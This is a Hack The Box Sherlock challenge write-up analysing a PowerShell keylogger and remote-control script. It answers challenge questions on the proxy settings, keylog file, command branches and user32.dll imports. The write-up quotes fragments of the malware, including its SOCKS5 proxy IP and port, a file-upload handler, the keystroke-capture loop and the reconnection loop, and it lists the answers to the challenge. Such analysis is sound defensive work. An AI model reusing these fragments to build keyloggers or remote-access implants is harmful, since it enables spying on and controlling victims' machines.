# PowerShell_Keylogger

### Scenario

You are a malware analyst investigating a suspected PowerShell malware sample. The malware is designed to establish a connection with a remote server, execute various commands, and potentially exfiltrate data. Your goal is to analyze the malware’s functionality and determine its capabilities.

| Field | Details |
| --- | --- |
| Platform | [Hack The Box — Sherlocks](https://app.hackthebox.com/sherlocks/PowerShell_Keylogger) |
| Difficulty | Easy |
| Category | Malware Analysis |
| Tools | PowerShell syntax analysis |
| Author | dmncdcco |

## Overview

The sample is a PowerShell script configured to communicate with a remote server through a SOCKS5 proxy. It collects system information and handles commands for taking screenshots, transferring files and starting a keylogger.

The main points to inspect are the connection parameters, the command-handling branches and the Windows API declarations. The following walkthrough examines those parts without executing the script.

## Tasks

### Task 0 — Proxy Port

**Question:** What is the proxy port used by the script?

- **Answer:** `9050`

- The proxy settings are defined in the opening `param` block:

```powershell
[string]$proxyAddress = "37.143.129.165",
[int]$proxyPort = 9050
```

- The script passes these values to `ConnectThrough`, which connects to the proxy before requesting a connection to the destination server.

- The proxy port is `9050`; the separate `$serverPort` value of `9999` belongs to the destination.

### Task 1 — Keylogging Function

**Question:** What function-method is used for starting keylogging?

- **Answer:** `Start-Keylogger`

- The keylogging logic is defined in the `Start-Keylogger` function. The command handler calls it when the remote server sends `keylog_start`:

```powershell
elseif ($command -eq "keylog_start") {
    if (-not $global:keylogger_active) {
        $keylogger_job = Start-Keylogger
        $writer.WriteLine("Keylogger started")
    }
}
```

- The function defines keyboard-related Windows API imports and starts a background job intended to monitor keystrokes.

### Task 2 — Keylog File

**Question:** What is the name of the file used by the script to store the keylog data?

- **Answer:** `keylog.txt`

- Inside the keylogging loop, `AppendAllText` writes captured characters to a file in the current user's temporary directory:

```powershell
[System.IO.File]::AppendAllText(
    "$env:temp\keylog.txt",
    $mychar,
    [System.Text.Encoding]::Unicode
)
```

- The filename is `keylog.txt`. Its full location depends on the value of `$env:temp`.

- The `Get-KeylogData` function reads this file and deletes it afterward. The `keylog_dump` command sends the retrieved contents through the connection.

### Task 3 — Persistence Command

**Question:** What command is used by the script to achieve persistence?

- **Answer:** `persist`

- The command handler contains a branch for the `persist` keyword:

```powershell
elseif ($command -eq "persist") {
    # Implémentez la logique de persistance ici si nécessaire
    $writer.WriteLine("Persistence mechanism is managed separately")
}
```

- This is the command requested by the challenge, but the branch contains no persistence implementation. It only sends a message stating that persistence is managed separately.

- The supplied script does not create a scheduled task, registry entry or another persistence mechanism in this block.

### Task 4 — Upload Command

**Question:** What is the command used by the script to upload data?

- **Answer:** `upload:`

- The script checks incoming commands for the `upload:` prefix:

```powershell
elseif ($command.StartsWith("upload:")) {
    $parts = $command.Split(":")
    $filePath = $parts[1]
    $fileData = $parts[2]
    [System.IO.File]::WriteAllBytes(
        $filePath,
        [Convert]::FromBase64String($fileData)
    )
    $writer.WriteLine("File uploaded successfully")
}
```

- This branch takes a destination path and Base64-encoded data from the received command, decodes the data and writes it to disk.

- Here, “upload” means transferring a file **to the machine running the script**. The separate `download:` branch reads a local file and sends its contents back to the remote server.

### Task 5 — IP Address Filter

**Question:** What is the regex used by the script to filter IP addresses?

- **Answer:** `^(127\.|169\.254\.)`

- The pattern appears in `Get-SystemInfo`, where the script selects a local IPv4 address:

```powershell
Get-NetIPAddress |
    Where-Object {
        $_.AddressFamily -eq "IPv4" -and
        $_.IPAddress -notmatch "^(127\.|169\.254\.)"
    } |
    Select-Object -First 1
```

- The `^` anchors the match to the beginning of the address. The two alternatives match addresses starting with `127.` or `169.254.`.

- Because the script uses `-notmatch`, it excludes loopback and IPv4 link-local addresses, then selects the first remaining IPv4 address.

### Task 6 — Keylogging DLL

**Question:** What is the DLL imported by the script to call keylogging APIs?

- **Answer:** `user32.dll`

- The API declarations inside `Start-Keylogger` reference `user32.dll`. One example is:

```csharp
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
```

- The script also declares `GetKeyboardState`, `MapVirtualKey` and `ToUnicode` from the same DLL.

- These functions are used to check keyboard state and convert key information into characters for the keylog file.

### Task 7 — Reconnection Delay

**Question:** How many seconds does the script wait before re-establishing a connection?

- **Answer:** `60`

- The outer loop contains a 60-second delay before calling `Establish-Connection` again after a fatal error:

```powershell
while ($true) {
    try {
        Establish-Connection -ip $serverAddress -port $serverPort `
            -proxyIp $proxyAddress -proxyPort $proxyPort
    }
    catch {
        Write-Error "Fatal error: $_"
        Start-Sleep -Seconds 60
    }
}
```

- There are two retry delays in the script:

| Location | Delay | Trigger |
| --- | --- | --- |
| Inside `Establish-Connection` | 30 seconds | An error handled by the function's own retry loop |
| Outer loop | 60 seconds | An error that reaches the outer `catch` block |

- The challenge expects the outer-loop value: `60`. The inner loop also retries connections, so the surrounding error-handling code matters when interpreting either value.

## Findings and Indicators

The script implements a remote-control command handler with functions for collecting system information, capturing screenshots, executing commands and transferring files. It also contains keylogging code that targets a temporary file named `keylog.txt`.

| Indicator | Value |
| --- | --- |
| Proxy IP | `37.143.129[.]165` |
| Proxy port | `9050` |
| Destination port | `9999` |
| Proxy protocol | `SOCKS5` |
| Keylog file | `%TEMP%\keylog.txt` |
| Keyboard API DLL | `user32.dll` |
| Persistence keyword | `persist` |
| Inner retry delay | `30 seconds` |
| Outer retry delay | `60 seconds` |

The `persist` branch is a placeholder, so its presence does not establish working persistence. Likewise, the code shows intended capabilities; confirming successful keylogging, command execution or data transfer would require runtime evidence.

---

*This write-up is intended for educational purposes and authorized security research.*
